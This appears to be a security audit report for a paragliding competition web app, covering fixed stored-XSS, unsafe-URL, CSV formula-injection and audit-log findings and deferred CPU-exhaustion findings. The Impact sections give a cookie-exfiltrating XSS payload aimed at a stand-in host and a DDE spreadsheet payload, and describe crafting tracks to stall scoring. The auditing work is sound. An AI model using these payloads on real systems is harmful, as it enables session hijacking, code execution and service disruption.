### Executive summary

**One High finding (SEC-41, a genuine stored-XSS gap), fixed inline this round; three Medium/Low mechanical gaps (SEC-42, SEC-43, SEC-44), also fixed inline; two further Medium/Low algorithmic-complexity findings (SEC-45, SEC-46) documented and deferred — no Critical.** SEC-41 is the round's headline: the frontend sweep found that **waypoint names and event descriptions were being interpolated into `innerHTML` unescaped at four call sites** — `formatGlideLabel()`'s glide-required-ratio label (`map-provider-shared.ts`, consumed by two render paths in `mapbox-provider.ts`), three spots in `analysis-panel.ts`'s task-status/legs/sequence rendering, the same file's flight-event list, `mapbox-provider.ts`'s event-marker popup, and three spots in `task-editor.ts` (one of them an **attribute-context** sink — `value="${tp.waypoint.name}"` — which is a stronger primitive than the text-context sinks, since a `"` in the name breaks out of the attribute directly). Every one of these is exactly the bug class SEC-05 flagged as still-open ("`innerHTML` remains the default rendering primitive") and SEC-22/23 were meant to have set the precedent for (pilot names, turnpoint names in the replay gaggle tooltip) — but neither prior fix's pattern had been extended to the glide-label, event-description, or task-editor code paths, so a comp admin (or anyone able to get a malicious name into a stored `.xctsk`, e.g. via import) could plant a payload that executes for any later viewer of that task's analysis page, no authentication required to view. All four/eight sites now route through the existing `escapeHtml()` helper; nothing new was invented. SEC-42 is a narrower version of the same class in new code: the just-added "official results" annotation (migration 0031) stores a `task_url`/`comp_url` from an (currently offline-only) importer and served it straight through to a public `<a href>` with no scheme check — a `javascript:` value would have been clickable-XSS on public score pages; fixed with a `safeExternalUrl()` guard server-side (the sole source of the value, so no frontend duplication was needed) plus a regression test. SEC-43 is the CSV-export sibling of the SEC-28/36 pattern: the route editor's own bespoke `csvField()` quoted commas/quotes/newlines but never neutralised a leading `=`/`+`/`-`/`@` formula trigger; replaced with the shared, already-audited `csvEscape()` from `csv.ts` rather than re-deriving the guard. SEC-44 is a straightforward audit-completeness gap the competition-api-routes subagent found: `PATCH /pilot/:comp_pilot_id` writes `civl_ranking_slug`/`civl_ranking_date`/`first_start_order` but the hand-written `auditFields` array (as opposed to the newer table-driven pattern in `comp.ts`) never listed them, so those changes — including a hand-override silently clearing CIVL provenance — left no trace in the public audit log; fixed by adding the three fields, with a regression test. On the deferred side, the engine subagent found **SEC-45**: the new PathFinder route optimiser's branch-and-bound remaining-distance search is `O(fixes) × O(turnpoints²)` in the worst case, and unlike the old greedy estimate it is now exact-mode, called once per non-goal pilot during the stale-first score revalidation that runs right after every track upload — including the **anonymous, unauthenticated** upload path. The Lipschitz-distance pruning that's supposed to bound the fix-count axis doesn't fire for ordinary "circling near the last-reached turnpoint before landing out" track shapes, and the codebase's own IGC-Forge tool already generates exactly that kind of wandering synthetic track. This is the same severity class as the already-fixed SEC-32/33 (quadratic-time engine scans on crafted/adversarial-shaped but plausible tracks) and needs the same treatment — a careful oracle-test-verified bound, not a one-line patch — so it's documented and deferred rather than rushed into this PR. **SEC-46** is a smaller instance of the same pattern the engine subagent noticed in passing while checking `circle-detector.ts`: a same-timestamp/non-monotonic-fix walk-back that restarts from `i-1` on every iteration, giving O(n²) on the exact fix-duplication shapes SEC-32/33 were written against; it predates this window (not a regression) and wasn't previously ticketed. Everything else came back clean: the new `web/workers/shared` package is a faithful, byte-identical extraction of the SEC-01 CORS allowlist and the SEC-39 atomic rate-limit upsert (confirmed by direct diff, not just re-reading the new location) with no widening of origins/headers/methods, and `airscore-api`'s wide-open `origin: '*'` CORS is confirmed correct-by-design (no credentials, no cookie-based auth, read-only public-data proxy); every route the SEC-37/38 fix (`64821cb`, `hiddenFromCaller()`) touched is still correctly gated, including through the `pilot.ts` split; the SEC-11/SEC-04 upload caps and shape checks are reused unchanged by the refactored `track-upload.ts`, and the new sha256 dedup column is hashed post-validation, never used for any auth/identity decision, and read only by an offline CLI script with no HTTP route anywhere near it; and SEC-40 (`thermal-shape.ts`'s unbounded clustering) is confirmed still open and byte-for-byte unchanged by this window's refactor, as expected for a documented deferral.

### New findings

#### SEC-41 — Unescaped waypoint/event names reach `innerHTML` at 8 call sites across the analysis page — **High** — ~~Open~~ **Fixed (2026-08-12, this PR)**

- **Files:**
  - `web/frontend/src/analysis/map-provider-shared.ts` — `formatGlideLabel()`'s `reqText` (`${marker.requiredGlideRatio}:1 to ${marker.targetName}`), consumed via `innerHTML` by both `mapbox-provider.ts:555-557` (glide-label creation) and `map-provider-shared.ts:992-994` (`updateGlideLabelElement`, reading the same value back off a `dataset` attribute).
  - `web/frontend/src/analysis/analysis-panel.ts` — the task-status banner (`:1010-1011`), the from/to leg names (`:1074-1075`), the sequence/reachings list (`:1096`), the comp-detail sequence row (`:1639-1641`), and the flight-event list's description (`:745`) — all `waypoint.name` or `event.description` interpolated into a template literal later assigned to `innerHTML`.
  - `web/frontend/src/analysis/mapbox-provider.ts:2875` — the event-marker map popup, same `event.description` value, via `mapboxgl.Popup.setHTML()`.
  - `web/frontend/src/analysis/task-editor.ts` — the turnpoint row header (`:424`, text context) and the expanded editor's name input (`:523`, **attribute context** — `value="${tp.waypoint.name}"`, breakable with a bare `"`), plus the waypoint-search result list (`:692-693`, `wp.description`/`wp.name`).
- **Evidence:** `web/engine/src/event-detector.ts:107` builds `FlightEvent.description` as `` `${crossing.direction === 'enter' ? 'Entered' : 'Exited'} ${tp.waypoint.name} (${tp.type})` `` — the engine has no HTML concerns and doesn't escape it (correctly, since escaping is a render-time concern per `escape-html.ts`'s own doc comment), so every consumer of `.description` was responsible for escaping at the point of `innerHTML` assignment and none of the sites above did. `waypoint.name` traces back to a task's `.xctsk` — set by whoever created or imported the task (a comp admin via the task editor, or an import pipeline) — and is rendered on the analysis page, which does not require authentication to view a task's track analysis.
- **Impact:** a task with a waypoint named e.g. `<img src=x onerror=fetch('//evil/'+document.cookie)>` executes same-origin script for any later viewer of that task's analysis page (glide markers render whenever a `glide_start`/`glide_end` event lands near that turnpoint; the event list and sequence panels render on every score-tab view; the map popup fires on marker click). The `task-editor.ts:523` attribute-context sink is reachable even by a comp admin who merely opens the editor to review an already-imported task carrying the payload — no click/hover needed, just loading the panel. Rated High rather than Critical: it requires the attacker to control a task's waypoint-name data (comp-admin-level trust, or an import pipeline), not raw public input, and Better Auth's session cookie is not itself readable via `document.cookie` (though same-origin authenticated `fetch` calls as the victim remain fully available to the payload, which is the more relevant risk for an admin-targeted payload).
- **Remediation (shipped):** every site above now wraps the untrusted portion of the string in the project's existing `escapeHtml()` helper (`web/frontend/src/escape-html.ts`) before interpolation — the same helper SEC-22/23 already established, just not previously extended to these call sites. No new abstraction introduced.
- **Verification:** `bun run --filter '@glidecomp/frontend' test` — 683/683 pass (no test previously covered the vulnerable path directly; the existing `escape-html.test.ts` suite covers the helper itself). Manually traced each of the 8 sites to confirm the escaped value is what reaches the DOM sink, not a value read back from an already-safe source.

#### SEC-42 — Unvalidated external URL in the new "official results" annotation renders as a public `href` — **Medium** — ~~Open~~ **Fixed (2026-08-12, this PR)**

- **Files:** `web/workers/competition-api/src/routes/score.ts` (`officialResultsWire`); rendered at `web/frontend/src/react/comp/ScoresSection.tsx:433`, `web/frontend/src/react/pages/PilotScoreDetail.tsx:858/882`, `web/frontend/src/react/comp/RulesEdition.tsx:73`.
- **Evidence:** `task.official_results` (migration 0031, #603) stores `comp_url`/`task_url` written by an offline importer script; `officialResultsWire()` passed both straight through to the wire response with no scheme check, and the frontend renders them as `<a href={...} target="_blank" rel="noopener">`. No allowlist of `http:`/`https:` existed anywhere in the pipeline.
- **Impact:** a `javascript:`-scheme value in either field would render as a clickable link on public, unauthenticated comp/task/pilot report-card pages and execute in the visitor's session on click. Rated Medium rather than higher: the only current writer is an offline CLI import script (no live HTTP route accepts these fields), so exploitation today requires whoever runs that script to either be malicious or import already-poisoned upstream data — but the wire boundary should not depend on that being true forever, and a future admin-facing edit tool for this field would otherwise inherit the gap silently.
- **Remediation (shipped):** a `safeExternalUrl()` helper in `score.ts` parses the value with the `URL` constructor and returns it only when the protocol is `http:` or `https:`, else `null`; applied to both `comp_url` and `task_url` before they enter `OfficialResultsWire`. Fixed at the sole source of the value, so no frontend-side duplication was needed.
- **Regression test:** `web/workers/competition-api/test/official-results.test.ts` — new case asserts a `javascript:` URL in either field is nulled out in the response while the rest of the annotation (source, ranks) still serves.

#### SEC-43 — Route-editor waypoint CSV export missing the SEC-28/36 formula-injection guard — **Low** — ~~Open~~ **Fixed (2026-08-12, this PR)**

- **Files:** `web/frontend/src/react/comp/route-editor.ts` (`turnpointsToCSV`, used by `RouteEditorDialog.tsx`'s "Export .csv").
- **Evidence:** the file's own `csvField()` quoted a value only when it contained a comma/quote/newline — it never prefixed a leading `=`/`+`/`-`/`@` with `'`, unlike the shared `csvEscape()` in `web/frontend/src/react/comp/csv.ts` that the pilots-roster and CIVL-rankings exports already use (SEC-28, SEC-36). Applied to `tp.waypoint.name`/`tp.waypoint.description`, both organiser-editable in the route editor grid.
- **Impact:** a turnpoint named e.g. `=cmd|'/c calc'!A1` exported and opened in Excel/Sheets triggers classic CSV/DDE formula injection. Rated Low (pre-existing gap in *existing* SEC-28/36 coverage rather than a new pattern, and requires the organiser to open their own exported file in a vulnerable spreadsheet app), not a new finding class.
- **Remediation (shipped):** deleted the file's bespoke `csvField()` and imported `csvEscape` from `./csv` instead, so every CSV writer in the app now shares one guard.
- **Verification:** `bun run --filter '@glidecomp/frontend' test` — 683/683 pass (no dedicated `route-editor.ts` CSV test existed to update; the shared `csvEscape()`'s own test coverage in `csv.test.ts` is unaffected and still passes).

#### SEC-44 — `PATCH /api/comp/:comp_id/pilot/:comp_pilot_id` omits CIVL-ranking-source and first-start-order fields from the audit log — **Medium** — ~~Open~~ **Fixed (2026-08-12, this PR)**

- **Files:** `web/workers/competition-api/src/routes/pilot.ts:909-924` (`auditFields`).
- **Evidence:** the route writes `civl_ranking_slug`, `civl_ranking_date`, and `first_start_order` (all in `COMP_PILOT_WRITE_COLUMNS`, all admin-writable), but the hand-written `auditFields` array used to generate per-field audit entries never listed them. Migration `0029_comp_pilot_civl_ranking_source.sql`'s own comment states these source columns "ARE audit-logged, unlike `pilot_ranking` itself: this is competition data an organiser entered" — CLAUDE.md's standing rule for exactly this kind of column. A PATCH that changed only the ranking-source fields, or that silently cleared them as a side effect of a hand-entered `wprs_points` override (confirmed behaviour per `test/civl-ranking-roster.test.ts`), produced zero audit trail; `first_start_order` (feeds launch-order display) had none at all.

No scoring input was affected (these columns are correctly excluded from `bumpAndRevalidateScores()`, matching the documented exception), so this is purely an audit-completeness gap, not a scoring-correctness one.

#### SEC-45 — New O(fixes)×O(turnpoints²) route-optimiser search, reachable via anonymous track upload — **Medium** — Open (deferred)

- **Files:** `web/engine/src/turnpoint-sequence-path.ts:426-473` (`computeBestProgress`, exact-mode branch-and-bound) → `web/engine/src/task-optimizer.ts:161-184` (`optimizeRemainingRoute`) → `web/engine/src/route-optimizer.ts:407-441` (`pathFinder`).
- **Evidence:** the new S7F 2026 PathFinder route optimiser (introduced by #576/#598/#613, none of it present before this window) replaces the old greedy remaining-distance estimate with an exact search. The branch-and-bound loop's Lipschitz-distance pruning only rules out a candidate fix when it is *spatially close* to an already-evaluated point; a track that lingers near its best-progress point (circling, searching for lift, before eventually landing out — ordinary flying behaviour, and exactly the shape the codebase's own IGC-Forge synthetic-track tool already generates per commit `05ae448`) produces many candidates that stay within tolerance of the eventual optimum while remaining spatially separated, defeating the prune. Each surviving candidate triggers a full `pathFinder()` call, itself `O(maxRounds × n)` with `maxRounds = 50 + n*10` (`n` = remaining turnpoints) — effectively `O(n²)` in turnpoint count, bounded only by the API-layer `MAX_XCTSK_TURNPOINTS = 50` (SEC-12), not by anything in the engine itself.
- **Impact:** IGC uploads are capped at `MAX_DECOMPRESSED_BYTES = 2 MiB` (SEC-11), which at ~35 bytes/B-record allows roughly 60,000 fixes — the same order of magnitude the SEC-32/33 write-ups used. If a crafted-but-plausible track (e.g. an extended wandering/circling phase) defeats pruning across even a few thousand of those fixes, the cost is tens of billions of trig/floating-point operations — many seconds to minutes of CPU. `resolveTurnpointSequence` (which reaches this exact-mode path) runs **server-side** during the stale-first score revalidation triggered right after every track upload (`bumpAndRevalidateScores` → `scoring/task-score.ts`), including via the **anonymous, unauthenticated** submission route (`docs/track-submission.md`) — so no account is needed to trigger it. Repeated revalidation failures leave that task's scores permanently stale per the stale-first design's own retry behaviour. Rated Medium, consistent with SEC-32/33's severity for the same bug class and the same reachability (any track upload, including anonymous) — not higher, because Cloudflare's own per-request CPU ceiling caps the actual blast radius to "this request fails / this task's scores stay stale," not a sustained multi-tenant outage.
- **Related, not itself a new SEC number:** the engine has no turnpoint-count cap of its own — `xctsk-parser.ts` imposes no limit on `data.turnpoints.length`, so the 50-turnpoint bound is purely an API-layer Zod convention (`validators.ts`), not an engine invariant. Any other caller (a script, a future worker, the client-side analysis tool working from a raw uploaded `.xctsk`) gets no protection from this axis. Worth hardening at the engine boundary (e.g. in `isValidTask`/`parseXCTask`) as a defence-in-depth measure alongside the fix below.
- **Remediation (deferred, not this PR):** this needs the same treatment SEC-32/33 received — read `computeBestProgress`/`pathFinder` in full, build oracle tests proving output parity against the current (pre-fix) behaviour across the engine's existing S7F 2026 test suite, then bound either the number of `exactAt()` evaluations per resolution (falling back to the approximate/seed value beyond a cap — the tolerance model already accepts small approximation) or the Lipschitz prune itself (e.g. an additional time-based bound using max groundspeed, so temporally-separated-but-spatially-close points still prune), verified against a ~60k-fix adversarial wandering track under a hard timeout. Not attempted inline this round because it requires the same careful verification discipline as SEC-32/33's fix, not a rushed one-line patch.

#### SEC-46 — Pre-existing same-timestamp O(n²) scan in `circle-detector.ts`, not previously ticketed — **Low** — Open (deferred)

- **Files:** `web/engine/src/circle-detector.ts:137-177` (`computeBearingRates`).
- **Evidence:** for each fix `i`, the lookback-window walk-back (`while (j > 0 && fixes[j].time.getTime() > targetTime) j--`) restarts from `i - 1` on every outer iteration rather than carrying a persistent pointer forward, unlike the fixed SEC-32 (`altitude-cleaning.ts`) and SEC-33 (`track-quality.ts`) scans, which had the same shape before their fix. Confirmed unchanged since before `dac06c5` (this window's diff to the file was a constant-name rename only, `git show dac06c5:web/engine/src/circle-detector.ts` matches the current loop structure).
- **Impact:** with normal ~1 Hz strictly-increasing timestamps this only walks back a few steps (effectively O(n)); with a run of same-timestamp or non-monotonic fixes — the exact "60k same-timestamp fixes" shape SEC-32/33's write-ups specified, and a realistic trigger for a GPS logger stall or duplicate-timestamp burst, not just an adversarial construction — the inner walk can retrace the entire same-timestamp run for every fix in it, giving O(n²) in fix count. Rated Low rather than Medium (unlike SEC-45): not newly introduced this window, and circle detection runs during the client-side analysis/replay path more than it gates server-side score revalidation, narrowing the blast radius relative to SEC-32/33/45.
- **Remediation (deferred, not this PR):** the same persisted-pointer or monotone-deque treatment as SEC-32/33, verified with an oracle test against the current implementation's output before changing it.
